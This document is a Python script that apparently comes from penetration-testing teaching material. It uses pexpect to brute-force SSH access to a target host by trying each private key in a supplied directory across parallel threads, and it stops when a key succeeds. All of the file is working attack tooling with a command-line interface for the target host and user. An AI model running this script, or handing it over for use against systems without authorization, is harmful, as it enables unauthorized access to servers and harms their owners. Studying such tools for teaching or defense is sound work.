import pexpect
import optparse
import os
from threading import *

maxConnections = 5
conn_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(host, user, keyfile, release):
    global Stop
    global Fails

    try:
        perm_denied = "Permission denied"
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            print('[+] Success.', str(keyfile))
            Stop = True
    except Exception as e:
        pass
    finally:
        if release:
            conn_lock.release()


def main():
    parser = optparse.OptionParser("usage%prog --host <target host> --user <target user> -d <ssh key directory>")
    parser.add_option('--host', dest='host')
    parser.add_option('--user', dest='user')
    parser.add_option('--d', dest='key_dir')

    options, args = parser.parse_args()
    host = options.host
    user = options.user
    key_dir = options.key_dir

    if not (host and user and key_dir):
        print(parser.usage)
        exit(0)
    for filename in os.listdir(key_dir):
        if Stop:
            print("[*] Exiting: Key Found.")
            exit(0)
        if Fails > maxConnections:
            print('[*] Exiting: Too many connections closed by remote host!')
            exit(0)
        conn_lock.acquire()
        fullpath = os.path.join(key_dir, filename)
        print('[-] Testing keyfile:', fullpath)
        t = Thread(target=connect, args=(host, user, fullpath, True))
        t.start()


if __name__ == '__main__':
    main()
